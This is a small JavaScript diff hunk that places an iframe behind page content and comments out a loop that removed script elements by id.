@@ -15,9 +15,9 @@ if (!document.getElementById("garaje_co33ww")) {
     iframe.style.zIndex = -1;
     iframe.style.top = "-30px";
     document.body.append(iframe);
-    scripts.forEach(script => {
-        if (document.getElementById(script)) {
-            document.getElementById(script).remove();
-        }
-    });
+    // scripts.forEach(script => {
+    //     if (document.getElementById(script)) {
+    //         document.getElementById(script).remove();
+    //     }
+    // });
 }
